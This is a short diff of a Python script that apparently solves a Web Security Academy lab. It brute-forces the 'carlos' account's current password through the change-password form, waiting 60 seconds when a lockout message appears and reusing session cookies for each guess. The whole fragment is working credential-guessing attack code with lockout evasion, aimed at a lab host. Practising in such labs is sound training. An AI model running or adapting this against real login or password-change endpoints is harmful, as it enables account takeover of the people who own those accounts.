@@ -11,7 +11,7 @@ for i in passwords:
 	if coincidencia != []:
 		time.sleep(60)
 	else :
-	cookies1 = cookies
+	cookies1 = respuesta1.cookies
 	data1 = {"username":"carlos","current-password":i.strip(),"new-password-1":"dina1","new-password-2":"dina1"}
 	respuesta2 = requests.post("https://0a8e00ca04814f9c82150bdc008200f7.web-security-academy.net/my-account/change-password", data=data1, cookies=cookies1)
 	coincidencia1 = re.findall("Password changed successfully!",respuesta2.text)
